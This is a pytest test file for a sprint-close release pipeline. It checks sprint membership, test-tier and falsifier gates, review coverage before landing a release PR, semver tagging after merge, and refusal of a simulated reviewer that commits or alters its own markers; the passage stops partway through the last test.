"""story-009: sprint-close pipeline. Verify: pytest -q tests/test_sprint_close.py"""

import json
import subprocess
import sys
from pathlib import Path

from test_close import launches, stub_reviewer

CLOSE = Path(__file__).parent.parent / "plugins" / "xp-plugin" / "scripts" / "close.py"
WORK = Path(__file__).parent.parent / "plugins" / "xp-plugin" / "scripts" / "work.py"
PLUGIN = Path(__file__).parent.parent / "plugins" / "xp-plugin"

PLAN = """# plan
## Milestone 1
### Sprint 2 — the one under test
#### story-042 — done thing   [done]
Verify: true
#### story-043 — also done   [done]
Verify: true

### Sprint 3
#### story-099 — not this sprint   [ready]
Verify: true
"""

CONFIG = (
    "release: sprint\nsprint_branch: sprint-002\n"
    "roles:\n  reviewer: claude/opus\ntests:\n  full: true\n"
)


def make_repo(tmp_path, plan=PLAN, config=CONFIG):
    repo = tmp_path / "repo"
    (repo / ".xp").mkdir(parents=True)
    env = {
        "PATH": f"{stub_reviewer(tmp_path)}:/usr/bin:/bin",
        "HOME": str(tmp_path),
        "XP_DATA": str(tmp_path / "data"),
    }
    g = lambda *a: subprocess.run(  # noqa: E731
        ["git", *a], cwd=repo, env=env, capture_output=True, text=True
    )
    g("init", "-q", "-b", "main")
    g("config", "user.email", "t@t")
    g("config", "user.name", "t")
    (repo / ".xp" / "plan.md").write_text(plan)
    (repo / ".xp" / "config.yml").write_text(config)
    (repo / ".xp" / "constraints.md").write_text("# Constraints\n1. CONSTRAINT-SENTINEL\n")
    (repo / ".xp" / "system.md").write_text("# System\nSYSTEM-SENTINEL\n")
    (repo / "src.py").write_text("A = 1\n")
    g("add", "-A")
    g("commit", "-qm", "base")
    g("checkout", "-qb", "sprint-002")
    # the sprint's own work, absent from the default branch: under `release:
    # sprint` an integration_target() diff would not carry it
    (repo / "src.py").write_text("A = 1\nB = 'SPRINT-ONLY-SENTINEL'\n")
    g("add", "-A")
    g("commit", "-qm", "story work on the sprint branch")
    return repo, env, g


def sprint(repo, env, *args, sprint_id="2"):
    return subprocess.run(
        [sys.executable, str(CLOSE), "sprint", sprint_id, *args],
        cwd=repo,
        env=env,
        capture_output=True,
        text=True,
    )


def head(repo, env):
    return subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, env=env, capture_output=True, text=True
    ).stdout.strip()


def marker_path(tmp_path, lens, sprint_id="2"):
    return tmp_path / "data" / "markers" / "sprint" / f"{sprint_id}.{lens}.json"


def record_reviews(tmp_path, repo, env, blocking=(), lenses=("broad", "security")):
    """CONSTRUCT the state a real review leaves, so land's guard is exercised
    against markers rather than against the absence of them."""
    for lens in lenses:
        path = marker_path(tmp_path, lens)
        path.parent.mkdir(parents=True, exist_ok=True)
        round_ = {"fixed": [], "blocking": list(blocking), "noted": []}
        path.write_text(json.dumps({"rounds": [round_], "shown_sha": head(repo, env)}))


def work(repo, env, *args):
    return subprocess.run(
        [sys.executable, str(WORK), *args], cwd=repo, env=env, capture_output=True, text=True
    )


def snapshot(root: Path):
    return {p.relative_to(root): p.read_bytes() for p in root.rglob("*") if p.is_file()}


class TestMembership:
    def test_other_sprints_do_not_block_this_one(self, tmp_path):
        """The naive reading — no story in plan.md is non-done — refuses forever,
        because Sprint 3 is [ready] right now and always will be."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-099" not in r.stdout

    def test_sprint_2_does_not_swallow_sprint_20(self, tmp_path):
        """Membership was a PREFIX match, so sprint 2 claimed sprint 20's cards:
        closing 2 would refuse forever on a story that is not its own, and a
        double-digit sprint would silently close two sprints as one."""
        repo, env, _g = make_repo(
            tmp_path,
            plan=PLAN.replace(
                "### Sprint 3",
                "### Sprint 20\n#### story-900 — not this sprint   [in-progress]\n\n### Sprint 3",
            ),
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-900" not in r.stdout + r.stderr

    def test_an_unfinished_story_in_THIS_sprint_refuses(self, tmp_path):
        repo, env, _g = make_repo(
            tmp_path,
            plan=PLAN.replace(
                "#### story-043 — also done   [done]", "#### story-043 — also done   [in-progress]"
            ),
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "story-043" in r.stderr


class TestFullTier:
    def test_a_red_full_tier_refuses(self, tmp_path):
        """The fixture tier was `true` — green by construction — so deleting the
        returncode check left every test passing. It is the primary gate of the
        leg: unguarded, sprint close certifies a red suite as a release."""
        repo, env, _g = make_repo(tmp_path, config=CONFIG.replace("full: true", "full: false"))
        r = sprint(repo, env, "start")
        assert r.returncode == 2, "a red full tier did not stop the close"
        assert "full tier" in r.stderr

    def test_a_red_batch_refuses_before_the_full_tier_runs(self, tmp_path):
        """afbd01a3: the batch ran the full tier (256 tests, ~25s) before refusing
        on a falsifier it could have checked first. The tier writes a sentinel;
        BOTH halves are asserted, because absence alone also passes an
        implementation that simply deleted the tier."""
        sentinel = tmp_path / "tier-ran"
        repo, env, _g = make_repo(
            tmp_path, config=CONFIG.replace("full: true", f"full: touch {sentinel}")
        )
        flag = tmp_path / "flag"
        flag.write_text("ok")
        work(
            repo, env, "debt", "--claim", "latent", "--falsifier", f"test -f {flag}", "--files", "a"
        )
        flag.unlink()
        assert sprint(repo, env, "start").returncode == 2
        assert not sentinel.exists(), "the expensive tier ran before the cheap batch refused"
        flag.write_text("ok")
        assert sprint(repo, env, "start").returncode == 0
        assert sentinel.exists(), "a green batch never reached the tier"

    def test_a_stray_top_level_key_cannot_override_the_declared_tier(self, tmp_path):
        """`full:` is only ever nested under `tests:` — the flat lookup was dead
        code, and worse than dead: a stray top-level key silently replaced the
        real tier with a green one and the close certified an unrun suite."""
        repo, env, _g = make_repo(
            tmp_path, config="full: true\n" + CONFIG.replace("full: true", "full: false")
        )
        assert sprint(repo, env, "start").returncode == 2, "a stray key shadowed the real tier"


class TestFalsifierBatch:
    def test_a_red_falsifier_aborts_and_is_refiled_as_a_bug(self, tmp_path):
        """Constructed, never observed: the fixture files a debt whose falsifier is
        green now and makes it red before the batch runs."""
        repo, env, _g = make_repo(tmp_path)
        flag = tmp_path / "flag"
        flag.write_text("ok")
        work(
            repo,
            env,
            "debt",
            "--claim",
            "latent",
            "--falsifier",
            f"test -f {flag}",
            "--files",
            "a.py",
        )
        flag.unlink()
        root = tmp_path / "data"
        before = snapshot(root)
        r = sprint(repo, env, "start")
        assert r.returncode == 2, r.stdout
        assert "latent" in r.stderr or "latent" in r.stdout
        after = snapshot(root)
        assert "## bug " in after[Path("work.md")].decode()
        # the append branch of the read-only property, which the green path
        # cannot reach: this is the only leg that writes anything at all
        assert after[Path("work.md")].startswith(before[Path("work.md")]), "work.md was rewritten"
        assert {k: v for k, v in after.items() if k != Path("work.md")} == {
            k: v for k, v in before.items() if k != Path("work.md")
        }

    def test_re_running_against_an_unfixed_red_files_one_bug_not_one_per_run(self, tmp_path):
        """The red path is the one that actually gets re-run — you fix, then run
        again. Each run appended a fresh duplicate, and every duplicate is itself
        a live record needing its own resolution, so the debris self-perpetuates."""
        repo, env, _g = make_repo(tmp_path)
        flag = tmp_path / "flag"
        flag.write_text("ok")
        work(
            repo,
            env,
            "debt",
            "--claim",
            "latent",
            "--falsifier",
            f"test -f {flag}",
            "--files",
            "a.py",
        )
        flag.unlink()
        for _ in range(3):
            assert sprint(repo, env, "start").returncode == 2
        filed = (tmp_path / "data" / "work.md").read_text().count("## bug ")
        assert filed == 1, f"three runs filed {filed} bugs for one unfixed red"

    def test_a_resolved_record_runs_the_RESOLUTION_falsifier_not_nothing(self, tmp_path):
        """A resolution that was wrong must red later and reopen the record."""
        repo, env, _g = make_repo(tmp_path)
        flag = tmp_path / "fixed"
        flag.write_text("ok")
        work(repo, env, "bug", "--claim", "broken", "--falsifier", "false", "--files", "a.py")
        ref = work(repo, env, "list").stdout.split()[0]
        assert (
            work(repo, env, "resolve", "--ref", ref, "--falsifier", f"test -f {flag}").returncode
            == 0
        )
        assert sprint(repo, env, "start").returncode == 0, "a green resolution should pass"
        flag.unlink()  # the fix regressed
        r = sprint(repo, env, "start")
        assert r.returncode == 2, "a resolved record was skipped instead of re-checked"

    def test_only_a_resolved_record_can_substitute_a_falsifier(self, tmp_path):
        """Keyed off the heading `resolve` writes, never off a `Resolves:` line
        anywhere in a block: a record that merely REFERENCES an id would
        substitute its own green falsifier, silencing a live bug with the
        green-check that resolve exists to enforce never having run."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "bug", "--claim", "live", "--falsifier", "false", "--files", "a.py")
        victim = work(repo, env, "list").stdout.split()[0]
        work(
            repo,
            env,
            "debt",
            "--claim",
            f"partial cleanup\nResolves: {victim}",
            "--falsifier",
            "true",
            "--files",
            "a.py",
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 2, "a record that only referenced an id silenced a live bug"


class TestStartIsReadOnly:
    def test_start_mutates_nothing_but_appends_to_work_md(self, tmp_path):
        """Structural, so the property survives every future addition to the leg."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "note", "a note to consume")
        root = tmp_path / "data"
        before = snapshot(root)
        before_head = subprocess.run(
            ["git", "rev-parse", "HEAD"], cwd=repo, env=env, capture_output=True, text=True
        ).stdout
        assert sprint(repo, env, "start").returncode == 0
        after = snapshot(root)
        for name, blob in before.items():
            if name == Path("work.md"):
                assert after[name].startswith(blob), "work.md was rewritten, not appended to"
            else:
                assert after[name] == blob, f"{name} changed during a read-and-emit leg"
        assert (
            subprocess.run(
                ["git", "rev-parse", "HEAD"], cwd=repo, env=env, capture_output=True, text=True
            ).stdout
            == before_head
        )

    def test_start_is_idempotent(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        first = sprint(repo, env, "start")
        second = sprint(repo, env, "start")
        assert first.returncode == second.returncode == 0
        assert first.stdout == second.stdout

    def test_start_emits_the_retro_skeleton_and_the_digest_PROMPT(self, tmp_path):
        """Constraint 7: deterministic Python may not summarize. It emits the
        prompt, exactly as close.py's story leg does."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "note", "SENTINEL-NOTE-FOR-TRIAGE")
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "SENTINEL-NOTE-FOR-TRIAGE" in r.stdout, "notes were not emitted for triage"
        assert "Retro" in r.stdout
        assert "digest" in r.stdout.lower()


class TestLandAndPostMerge:
    def test_land_dry_run_previews_the_commands_it_would_run(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)  # land now refuses without a covering review
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout
        assert (
            subprocess.run(
                ["git", "tag"], cwd=repo, env=env, capture_output=True, text=True
            ).stdout.strip()
            == ""
        ), "a preview created a tag"

    def test_land_refuses_to_advertise_a_version_it_cannot_compute(self, tmp_path):
        """The PR title names the release; guessing there is the same lie."""
        repo, env, g = make_repo(tmp_path)
        g("tag", "release-2024")
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "release-2024" in r.stderr

    def test_land_refuses_without_gh_before_anything_moves(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land")
        assert r.returncode == 2 and "gh" in r.stderr

    def test_the_tag_is_cut_post_merge_on_the_merged_trunk_sha(self, tmp_path):
        """Cut at PR-open it names a commit that is not the release: the review
        commits the PR exists to produce land after it."""
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        g("checkout", "-q", "main")
        g("merge", "-q", "--no-ff", "sprint-002", "-m", "release")
        merged = g("rev-parse", "HEAD").stdout.strip()
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 0, r.stderr
        tags = g("tag").stdout.split()
        assert "v0.3.0" in tags, tags
        assert g("rev-list", "-n1", "v0.3.0").stdout.strip() == merged

    def test_post_merge_retires_the_sprint_branch_key(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        g("checkout", "-q", "main")
        g("merge", "-q", "--no-ff", "sprint-002", "-m", "release")
        assert sprint(repo, env, "post-merge").returncode == 0
        assert "sprint_branch:" not in (repo / ".xp" / "config.yml").read_text()

    def test_post_merge_on_the_unmerged_sprint_branch_refuses(self, tmp_path):
        """The leg exists to cut the tag on the sha that SHIPPED. Nothing made
        that true: it tagged whatever HEAD was, so running it without checking
        out trunk named an unreviewed sprint-branch commit as the release."""
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        (repo / "unreviewed.py").write_text("# never went through the PR\n")
        g("add", "-A")
        g("commit", "-qm", "unmerged work")
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 2, "tagged a release on an unmerged branch"
        assert "v0.3.0" not in g("tag").stdout.split()
        assert "sprint_branch:" in (repo / ".xp" / "config.yml").read_text()

    def test_post_merge_on_trunk_without_the_merge_refuses(self, tmp_path):
        """On trunk, but the sprint branch never landed: the tag would name a
        commit that contains none of the sprint."""
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        (repo / "unreviewed.py").write_text("# never went through the PR\n")
        g("add", "-A")
        g("commit", "-qm", "unmerged work")
        g("checkout", "-q", "main")
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 2, "tagged a release that contains none of the sprint"
        assert "v0.3.0" not in g("tag").stdout.split()

    def test_a_non_semver_latest_tag_refuses(self, tmp_path):
        """AC 12 makes the latest git tag the version source so the leg works in
        a CONSUMING project — whose tag scheme is exactly the input we do not
        control. `v1.x` tracebacked; `release-2024` minted `vrelease-2024.1.0`."""
        repo, env, g = make_repo(tmp_path)
        g("tag", "release-2024")
        g("checkout", "-q", "main")
        g("merge", "-q", "--no-ff", "sprint-002", "-m", "release")
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr
        assert g("tag").stdout.split() == ["release-2024"], "minted a version off a non-semver tag"

    def test_post_merge_without_a_config_refuses_rather_than_tracebacks(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        g("checkout", "-q", "main")
        g("merge", "-q", "--no-ff", "sprint-002", "-m", "release")
        (repo / ".xp" / "config.yml").unlink()
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr

    def test_an_existing_tag_refuses_before_anything_moves(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        g("tag", "v0.2.1")
        g("tag", "v0.3.0")
        g("checkout", "-q", "main")
        g("merge", "-q", "--no-ff", "sprint-002", "-m", "release")
        r = sprint(repo, env, "post-merge")
        assert r.returncode == 2 and "v0.3.0" in r.stderr
        assert "sprint_branch:" in (repo / ".xp" / "config.yml").read_text()


class TestLandCoverage:
    """Bug c9b48a66: sprint land had NO coverage check, so a release PR could open
    over unreviewed commits. Measured at sprint-002's own release — the broad
    review ran at 9b91b1f and four commits (15 files, +261/-18) landed after it.

    Every test here drives `land --dry-run`. Under the fixture PATH there is no
    `gh`, so a real land already exits 2 at shutil.which having pushed nothing —
    "rc 2 and nothing pushed" cannot tell this guard from that refusal, and would
    have certified a coverage check that does not exist. --dry-run returns 0
    BEFORE the gh check, so rc 0 vs rc 2 is a discriminator no pre-existing
    refusal can produce.
    """

    def test_land_with_no_recorded_review_at_all_refuses(self, tmp_path):
        """The base case IS the bug's claim. A guard that fires only when a record
        exists greens the do-nothing path — which is the whole defect."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, "a release PR opened with no review recorded anywhere"
        assert "review --lens" in r.stderr, "the refusal names no way out"

    def test_land_refuses_when_only_one_lens_was_reviewed(self, tmp_path):
        """PROCESS.md §4 and the skill both mandate the two reviews, so a one-lens
        gate certifies a close the process forbids."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, lenses=("broad",))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "security" in r.stderr

    def test_land_proceeds_once_both_lenses_cover_head(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout

    def test_land_refuses_while_the_last_round_has_blocking_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, blocking=["A-BLOCKING-FINDING"])
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "A-BLOCKING-FINDING" in r.stderr

    def test_land_refuses_when_a_CODE_commit_landed_after_the_review(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nUNREVIEWED = 2\n")
        g("add", "-A")
        g("commit", "-qm", "code after the review")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_land_proceeds_when_the_whole_delta_since_the_review_is_under_xp(self, tmp_path):
        """Paul's call, and it rests on the retro diff having its own human review
        at triage — NOT on .xp/ being harmless. Retro, digest and plan-status
        commits always land after the reviews, so a strict rule forces a fresh
        broad AND security review at every close: the afbd01a3 wedge, where
        completing the close invalidates the review that permits it."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "plan.md").write_text(PLAN + "\n<!-- retro -->\n")
        g("add", "-A")
        g("commit", "-qm", "retro and plan flips")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert ".xp/plan.md" in r.stdout, "an exemption nobody is shown is a silent one"

    def test_a_code_change_alongside_an_xp_change_is_NOT_exempt(self, tmp_path):
        """Code motion is never exempt; without this the exemption is a hole."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "plan.md").write_text(PLAN + "\n<!-- retro -->\n")
        (repo / "src.py").write_text("A = 1\nSMUGGLED = 3\n")
        g("add", "-A")
        g("commit", "-qm", "retro, and one line of code")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "src.py" in r.stderr

    def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
        """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
        whose first word is SYMMETRY invites exactly that wrong copy from
        close.cmd_land."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        g("checkout", "-q", "main")
        (repo / "unrelated.py").write_text("C = 3\n")
        g("add", "-A")
        g("commit", "-qm", "trunk moved under us")
        g("checkout", "-q", "sprint-002")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr

    def test_a_recorded_sha_that_no_longer_resolves_refuses_not_tracebacks(self, tmp_path):
        """close.git runs check=True, so a rebased or gc'd sha would raise
        CalledProcessError inside the release gate."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        path = marker_path(tmp_path, "broad")
        state = json.loads(path.read_text())
        state["shown_sha"] = "0" * 40
        path.write_text(json.dumps(state))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr


class TestReviewLeg:
    """story-014: the sprint close marshals its reviews, one leg, two lenses."""

    def test_the_bundle_diffs_against_the_DEFAULT_branch_not_the_integration_target(self, tmp_path):
        """Under `release: sprint`, integration_target() returns the SPRINT branch
        and the fixture is ON it — so that diff is EMPTY and the reviewer would
        certify nothing. A header-grep assertion passes over an empty diff, which
        is bug c9b48a66's own failure mode; a hardcoded "main" passes vacuously
        here and breaks a `master` consumer. So: a string only a sprint-branch
        commit carries."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 0, r.stderr
        assert "SPRINT-ONLY-SENTINEL" in launches(tmp_path)[0]["stdin"]

    def test_the_bundle_carries_the_cards_constraints_and_system(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        bundle = launches(tmp_path)[0]["stdin"]
        assert "CONSTRAINT-SENTINEL" in bundle and "SYSTEM-SENTINEL" in bundle
        assert "story-042 — done thing" in bundle, "the sprint's story cards"
        assert "story-099" not in bundle, "another sprint's card rode along"
        assert "Polarity" in bundle, "PROCESS.md, which the charter points at"

    def test_a_story_cannot_shadow_the_sprints_report_or_marker_key(self, tmp_path):
        """Constraint 10, fault-injected against the id that would collide: a
        story literally named `sprint-2.broad`. BOTH keys — scoping the report and
        not the marker hands the land gate the collision the report just refused.
        Driven through both real legs, because comparing two Path expressions
        holds even against an implementation nobody can reach."""
        plan = PLAN.replace(
            "#### story-043 — also done   [done]",
            "#### story-043 — also done   [done]\n"
            "#### sprint-2.broad — the colliding id   [in-progress]\nVerify: true",
        )
        repo, env, g = make_repo(tmp_path, plan=plan)
        g("checkout", "-qb", "story-branch")
        story = subprocess.run(
            [sys.executable, str(CLOSE), "story", "sprint-2.broad", "review"],
            cwd=repo,
            env=env,
            capture_output=True,
            text=True,
        )
        assert story.returncode == 0, story.stderr
        g("checkout", "-q", "sprint-002")
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        data = tmp_path / "data"
        written = sorted(p.name for p in (data / "reports").rglob("*.json"))
        markers = sorted(p.name for p in (data / "markers").rglob("*.json"))
        assert len(written) == 2, f"the sprint and the story shared a report key: {written}"
        assert len(markers) == 2, f"the sprint and the story shared a marker key: {markers}"
        assert marker_path(tmp_path, "broad").exists()

    def test_the_review_leg_run_from_the_default_branch_is_refused(self, tmp_path):
        """close.py:186 has this guard for the story leg. Without it the diff is
        empty and land pushes whatever branch HEAD happens to be on."""
        repo, env, g = make_repo(tmp_path)
        g("checkout", "-q", "main")
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2 and "main" in r.stderr
        assert launches(tmp_path) == [], "spawned a reviewer over an empty diff"

    def test_an_unknown_lens_is_refused_naming_the_ones_that_exist(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "review", "--lens", "vibes")
        assert r.returncode == 2 and "broad" in r.stderr and "security" in r.stderr
        assert launches(tmp_path) == []

    def test_a_dirty_tree_is_refused_before_the_reviewer_is_launched(self, tmp_path):
        """Untested until round 1: deleting this guard left all 54 green. Without
        it the leg spends a whole review and only then refuses, on dirt the lead
        may have left."""
        repo, env, _g = make_repo(tmp_path)
        (repo / "src.py").write_text("A = 1\nUNCOMMITTED = 2\n")
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2 and "dirty" in r.stderr
        assert launches(tmp_path) == [], "reviewed a tree that was already dirty"

    def test_a_sprint_id_with_no_section_in_the_plan_is_refused(self, tmp_path):
        """Also untested until round 1. cmd_start has this guard; the review leg
        would otherwise spawn over empty cards and record coverage for a sprint
        that does not exist, which sprint land then honours."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "review", "--lens", "broad", sprint_id="99")
        assert r.returncode == 2 and "99" in r.stderr
        assert launches(tmp_path) == []

    def test_dry_run_launches_nothing_and_records_nothing(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "review", "--lens", "broad", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert launches(tmp_path) == []
        assert not marker_path(tmp_path, "broad").exists()

    def test_the_two_lenses_keep_separate_markers_reports_and_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        stub_reviewer(tmp_path, report={"fixed": [], "blocking": [], "noted": ["BROAD-FINDING"]})
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        assert sprint(repo, env, "review", "--lens", "security").returncode == 0
        assert marker_path(tmp_path, "broad").exists()
        assert marker_path(tmp_path, "security").exists()
        assert "BROAD-FINDING" not in launches(tmp_path)[1]["stdin"], "prior findings leaked lens"


WORK_SECTION = "work.md entries filed during the sprint"


def section(bundle, title, until):
    """A named section's body. Sliced between two titles rather than split on a
    blank-line-plus-`## ` boundary, because the raw work.md section carries
    `## note` headings of its own and would cut itself in half."""
    head = f"## {title}\n\n"
    start = bundle.index(head) + len(head)
    return bundle[start : bundle.index(f"## {until}\n\n", start)]


class TestResolutionsAreCarried:
    """AC 5. Three of three resolutions that needed independent reading were
    caught by a READER, never by resolve()'s green-check (7df6b116, b9382e2d,
    997c0c63) — and resolutions filed AT the close are read by no reviewer at
    all, which is the moment they are most likely to be falsified."""

    def _resolved_twice(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        work(
            repo,
            env,
            "bug",
            "--claim",
            "THE-ORIGINAL-CLAIM",
            "--falsifier",
            "false # ORIGINAL-FALSIFIER",
            "--files",
            "a.py",
        )
        ref = work(repo, env, "list").stdout.split()[0]
        for attempt in ("SUPERSEDED-TRY", "LATEST-TRY"):
            assert (
                work(
                    repo, env, "resolve", "--ref", ref, "--falsifier", f"true # {attempt}"
                ).returncode
                == 0
            )
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        return ref, launches(tmp_path)[0]["stdin"]

    def test_the_bundle_carries_the_claim_and_original_falsifier_it_replaced(self, tmp_path):
        """corpus() cannot serve this: substitution is exactly where it discards
        the original, and the original is what makes the swap judgeable."""
        ref, bundle = self._resolved_twice(tmp_path)
        body = section(bundle, "Resolutions filed during the sprint", WORK_SECTION)
        assert ref in body
        assert "THE-ORIGINAL-CLAIM" in body
        assert "ORIGINAL-FALSIFIER" in body, "no original: the reader cannot judge the swap"
        assert "LATEST-TRY" in body

    def test_only_the_latest_resolution_per_record_survives(self, tmp_path):
        _ref, bundle = self._resolved_twice(tmp_path)
        assert "SUPERSEDED-TRY" not in bundle, "every superseded correction shipped verbatim"

    def test_resolved_blocks_are_filtered_out_of_the_raw_work_md_section(self, tmp_path):
        """They are work.md entries, so shipping both hands the reviewer the same
        substitution twice and invites the re-litigation the dedup prevents."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "bug", "--claim", "c", "--falsifier", "false", "--files", "a.py")
        ref = work(repo, env, "list").stdout.split()[0]
        work(repo, env, "resolve", "--ref", ref, "--falsifier", "true # THE-REPLACEMENT")
        work(repo, env, "note", "A-PLAIN-NOTE")
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        raw = section(launches(tmp_path)[0]["stdin"], WORK_SECTION, "PROCESS")
        assert "A-PLAIN-NOTE" in raw, "the raw section lost the entries it exists to carry"
        assert "## resolved " not in raw


class TestModeSwitch:
    """Note bae0b87b: findings handed in -> validate each; none handed in -> run
    the full pass. The mode switch is what BOUNDS the work — sprint-002's close
    re-reviewed four fix-commits with no prior findings to bound the pass."""

    def test_round_1_tells_the_reviewer_to_run_the_full_pass(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        # the SECTION's own words: the charter also says "run the full pass",
        # so a bare "full pass" grep passes on every bundle ever built
        assert "none — run the full pass yourself" in launches(tmp_path)[0]["stdin"]

    def test_a_second_round_of_the_same_lens_carries_the_prior_findings(self, tmp_path):
        """Read from the MARKER state, which is where close.py keeps rounds.
        Reading `reports/` off disk would be a second source of truth — so the
        fixture CONSTRUCTS the marker, never the report file."""
        repo, env, _g = make_repo(tmp_path)
        path = marker_path(tmp_path, "broad")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            json.dumps(
                {
                    "rounds": [
                        {"fixed": [], "blocking": ["ROUND-1-BLOCKER"], "noted": ["ROUND-1-NOTE"]}
                    ],
                    "shown_sha": head(repo, env),
                }
            )
        )
        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
        bundle = launches(tmp_path)[0]["stdin"]
        assert "ROUND-1-BLOCKER" in bundle and "ROUND-1-NOTE" in bundle
        assert "validate that each was addressed; do not re-derive the diff" in bundle
        assert "run the full pass yourself" not in bundle, "handed findings AND told to re-derive"


def committing_stub(tmp_path, body):
    """A stub that writes a valid report and then moves the tree. A stub that
    never moves it certifies nothing (constraint 2)."""
    bin_dir = stub_reviewer(tmp_path)
    claude = bin_dir / "claude"
    claude.write_text(claude.read_text().replace("sys.stdout.write(", body + "\nsys.stdout.write("))
    claude.chmod(0o755)
    return bin_dir


class TestReportOnlyIsAMechanism:
    """AC 2. The card calls report-only a MECHANISM, not a charter claim, because
    the plan review found the claim unenforced. The agent file's `tools:` line
    bounds nothing here: review.run launches a TOP-LEVEL claude session that never
    loads the agent file — which is why charter() inlines it."""

    def test_a_reviewer_that_COMMITS_is_refused_and_records_nothing(self, tmp_path):
        """This is ALSO where the pre-launch head capture is pinned. A stub that
        never commits cannot tell a pre-launch head from a post-run one, so the
        test that asserted the ordering directly was vacuous and was deleted in
        round 1; deleting check_report_only's head compare reds THIS test."""
        repo, env, _g = make_repo(tmp_path)
        committing_stub(
            tmp_path,
            "open('snuck.py','w').write('X = 1\\n')\n"
            "os.system('git add -A && git commit -qm snuck')\n",
        )
        before = head(repo, env)
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2, r.stdout
        assert before[:8] in r.stderr, "the undo names no sha to reset to"
        assert not marker_path(tmp_path, "broad").exists(), "recorded a round it refused"

    def test_a_reviewer_that_leaves_the_tree_DIRTY_is_refused(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        committing_stub(tmp_path, "open('src.py','a').write('# edited\\n')\n")
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2 and "dirty" in r.stderr
        assert not marker_path(tmp_path, "broad").exists()

    def test_a_reviewer_that_rewrites_the_MARKER_is_refused(self, tmp_path):
        """The marker is outside the repo, no diff shows it, and it is the file
        land reads for rounds and blocking[] — a review may not move its own gate."""
        repo, env, _g = make_repo(tmp_path)
        path = marker_path(tmp_path, "broad")
